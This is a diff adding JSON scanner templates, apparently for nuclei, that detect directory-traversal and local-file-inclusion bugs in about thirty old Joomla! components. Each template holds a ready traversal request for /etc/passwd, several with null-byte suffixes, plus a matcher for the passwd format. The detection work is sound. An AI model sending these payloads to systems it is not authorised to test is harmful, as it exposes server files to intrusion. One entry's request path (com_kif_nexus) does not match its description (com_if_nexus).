@@ -163,6 +163,43 @@
       ]
     },
     {
+      "id": "CVE-2007-4504",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in index.php in the RSfiles component (com_rsfiles) 1.0.2 and earlier for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the path parameter in a files.display action.",
+        "name": "Joomla! Component RSfiles 1.0.2 - 'path' File Download",
+        "reference": [
+          "https://www.exploit-db.com/exploits/4307",
+          "https://www.cvedetails.com/cve/CVE-2007-4504"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2007,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_rsfiles&task=files.display&path=../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2007-4556",
       "info": {
         "author": "pikpikcu",
@@ -352,6 +389,43 @@
       ]
     },
     {
+      "id": "CVE-2008-6080",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in download.php in the ionFiles (com_ionfiles) 4.4.2 component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter.",
+        "name": "Joomla! Component ionFiles 4.4.2 - File Disclosure",
+        "reference": [
+          "https://www.exploit-db.com/exploits/6809",
+          "https://www.cvedetails.com/cve/CVE-2008-6080"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2008,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/components/com_ionfiles/download.php?file=../../../../../../../../etc/passwd&download=1"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2008-6172",
       "info": {
         "author": "daffainfo",
@@ -384,6 +458,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/components/com_rwcards/captcha/captcha_image.php?img=../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2008-6222",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Pro Desk Support Center (com_pro_desk) component 1.0 and 1.2 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the include_file parameter to index.php.",
+        "name": "Joomla! Component ProDesk 1.0/1.2 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/6980",
+          "https://www.cvedetails.com/cve/CVE-2008-6222"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2008,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd"
           ]
         }
       ]
@@ -529,6 +640,43 @@
       ]
     },
     {
+      "id": "CVE-2009-1496",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Cmi Marketplace (com_cmimarketplace) component 0.1 for Joomla! allows remote attackers to list arbitrary directories via a .. (dot dot) in the viewit parameter to index.php.",
+        "name": "Joomla! Component Cmimarketplace - 'viewit' Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/8367",
+          "https://www.cvedetails.com/cve/CVE-2009-1496"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2009,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_cmimarketplace&Itemid=70&viewit=/../../../../../../etc/passwd&cid=1"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2009-1558",
       "info": {
         "author": "daffainfo",
@@ -608,6 +756,191 @@
       ]
     },
     {
+      "id": "CVE-2009-2015",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in includes/file_includer.php in the Ideal MooFAQ (com_moofaq) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter.",
+        "name": "Joomla! Component MooFAQ (com_moofaq) - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/8898",
+          "https://www.cvedetails.com/cve/CVE-2009-2015"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2009,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/components/com_moofaq/includes/file_includer.php?gzip=0&file=/../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2009-2100",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the JoomlaPraise Projectfork (com_projectfork) component 2.0.10 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the section parameter to index.php.",
+        "name": "Joomla! Component com_Projectfork 2.0.10 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/8946",
+          "https://www.cvedetails.com/cve/CVE-2009-2100"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2009,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_projectfork&section=../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2009-3053",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Agora (com_agora) component 3.0.0b for Joomla! allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the action parameter to the avatars page, reachable through index.php.",
+        "name": "Joomla! Component Agora 3.0.0b (com_agora) - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/9564",
+          "https://www.cvedetails.com/cve/CVE-2009-3053"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2009,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_agora&task=profile&page=avatars&action=../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2009-3318",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Roland Breedveld Album (com_album) component 1.14 for Joomla! allows remote attackers to access arbitrary directories and have unspecified other impact via a .. (dot dot) in the target parameter to index.php.",
+        "name": "Joomla! Component com_album 1.14 - Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/9706",
+          "https://www.cvedetails.com/cve/CVE-2009-3318"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2009,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_album&Itemid=128&target=../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2009-4202",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Omilen Photo Gallery (com_omphotogallery) component Beta 0.5 for Joomla! allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the controller parameter to index.php.",
+        "name": "Joomla! Component Omilen Photo Gallery 0.5b - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/8870",
+          "https://www.cvedetails.com/cve/CVE-2009-4202"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2009,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_omphotogallery&controller=../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2009-4223",
       "info": {
         "author": "geeknik",
@@ -646,6 +979,40 @@
       ]
     },
     {
+      "id": "CVE-2009-4679",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the inertialFATE iF Portfolio Nexus (com_if_nexus) component 1.5 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component iF Portfolio Nexus - 'Controller' Remote File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/33440\n- https://www.cvedetails.com/cve/CVE-2009-4679\n",
+        "severity": "high",
+        "tags": "cve,cve2009,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_kif_nexus&controller=../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2009-5114",
       "info": {
         "author": "daffainfo",
@@ -678,6 +1045,194 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-0157",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Bible Study (com_biblestudy) component 6.1 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter in a studieslist action to index.php.",
+        "name": "Joomla! Component com_biblestudy - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/10943",
+          "https://www.cvedetails.com/cve/CVE-2010-0157"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_biblestudy&id=1&view=studieslist&controller=../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-0467",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2010-0467",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N",
+          "cvss-score": 5.8,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Directory traversal vulnerability in the ccNewsletter (com_ccnewsletter) component 1.0.5 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter in a ccnewsletter action to index.php.",
+        "name": "Joomla! Component CCNewsLetter - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/11282\n- https://www.cvedetails.com/cve/CVE-2010-0467\n",
+        "severity": "medium",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_ccnewsletter&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-0696",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in includes/download.php in the JoomlaWorks AllVideos (Jw_allVideos) plugin 3.0 through 3.2 for Joomla! allows remote attackers to read arbitrary files via a ./../.../ (modified dot dot) in the file parameter.",
+        "name": "Joomla! Component Jw_allVideos - Arbitrary File Download",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11447",
+          "https://www.cvedetails.com/cve/CVE-2010-0696"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plugins/content/jw_allvideos/includes/download.php?file=../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-0759",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php in the Core Design Scriptegrator plugin 1.4.1 for Joomla! allows remote attackers to read, and possibly include and execute, arbitrary files via directory traversal sequences in the files[] parameter.",
+        "name": "Joomla! Plugin Core Design Scriptegrator - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11498",
+          "https://www.cvedetails.com/cve/CVE-2010-0759"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-0942",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the jVideoDirect (com_jvideodirect) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component com_jvideodirect - Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11089",
+          "https://www.cvedetails.com/cve/CVE-2010-0942"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jvideodirect&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -757,6 +1312,80 @@
       ]
     },
     {
+      "id": "CVE-2010-0972",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the GCalendar (com_gcalendar) component 2.1.5 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component com_gcalendar Suite 2.1.5 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11738",
+          "https://www.cvedetails.com/cve/CVE-2010-0972"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_gcalendar&controller=../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-0982",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the CARTwebERP (com_cartweberp) component 1.56.75 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component com_cartweberp - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/10942",
+          "https://www.cvedetails.com/cve/CVE-2010-0982"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_cartweberp&controller=../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-0985",
       "info": {
         "author": "daffainfo",
@@ -794,6 +1423,117 @@
       ]
     },
     {
+      "id": "CVE-2010-1056",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the RokDownloads (com_rokdownloads) component before 1.0.1 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component com_rokdownloads - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11760",
+          "https://www.cvedetails.com/cve/CVE-2010-1056"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_rokdownloads&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1081",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Community Polls (com_communitypolls) component 1.5.2, and possibly earlier, for Core Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component com_communitypolls 1.5.2 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11511",
+          "https://www.cvedetails.com/cve/CVE-2010-1081"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_communitypolls&controller=../../../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1217",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the JE Form Creator (com_jeformcr) component for Joomla!, when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via directory traversal sequences in the view parameter to index.php. NOTE the original researcher states that the affected product is JE Tooltip, not Form Creator; however, the exploit URL suggests that Form Creator is affected.",
+        "name": "Joomla! Component & Plugin JE Tooltip 1.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11814",
+          "https://www.cvedetails.com/cve/CVE-2010-1217"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jeformcr&view=../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1219",
       "info": {
         "author": "daffainfo",
@@ -826,6 +1566,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_janews&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1302",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in dwgraphs.php in the DecryptWeb DW Graphs (com_dwgraphs) component 1.0 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.",
+        "name": "Joomla! Component DW Graph - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11978",
+          "https://www.cvedetails.com/cve/CVE-2010-1302"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_dwgraphs&controller=../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -1164,6 +1941,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1340",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in jresearch.php in the J!Research (com_jresearch) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component com_jresearch - 'Controller' Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/33797",
+          "https://www.cvedetails.com/cve/CVE-2010-1340"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jresearch&controller=../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1345",
       "info": {
         "author": "daffainfo",
@@ -1307,6 +2121,74 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_vjdeo&controller=../../../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1461",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Photo Battle (com_photobattle) component 1.0.1 for Joomla! allows remote attackers to read arbitrary files via the view parameter to index.php.",
+        "name": "Joomla! Component Photo Battle 1.0.1 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12232\n- https://www.cvedetails.com/cve/CVE-2010-1461\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_photobattle&view=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1469",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Ternaria Informatica JProject Manager (com_jprojectmanager) component 1.0 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component JProject Manager 1.0 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12146\n- https://www.cvedetails.com/cve/CVE-2010-1469\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -1571,6 +2453,77 @@
       ]
     },
     {
+      "id": "CVE-2010-1478",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Ternaria Informatica Jfeedback! (com_jfeedback) component 1.2 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Jfeedback 1.2 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12145\n- https://www.cvedetails.com/cve/CVE-2010-1478\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jfeedback&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1491",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the MMS Blog (com_mmsblog) component 2.3.0 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component MMS Blog 2.3.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12318",
+          "https://www.cvedetails.com/cve/CVE-2010-1491"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_mmsblog&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1494",
       "info": {
         "author": "daffainfo",
@@ -1830,6 +2783,40 @@
       ]
     },
     {
+      "id": "CVE-2010-1540",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in index.php in the MyBlog (com_myblog) component 3.0.329 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the task parameter.",
+        "name": "Joomla! Component com_blog - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/11625\n- https://www.cvedetails.com/cve/CVE-2010-1540\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_myblog&Itemid=1&task=../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1601",
       "info": {
         "author": "daffainfo",
@@ -1904,6 +2891,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1603",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the ZiMB Core (aka ZiMBCore or com_zimbcore) component 0.1 in the ZiMB Manager collection for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component ZiMBCore 0.1 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12284",
+          "https://www.cvedetails.com/cve/CVE-2010-1603"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_zimbcore&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1607",
       "info": {
         "author": "daffainfo",
@@ -1941,6 +2965,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1653",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in graphics.php in the Graphics (com_graphics) component 1.0.6 and 1.5.0 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php. NOTE some of these details are obtained from third party information.",
+        "name": "Joomla! Component Graphics 1.0.6 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12430",
+          "https://www.cvedetails.com/cve/CVE-2010-1653"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
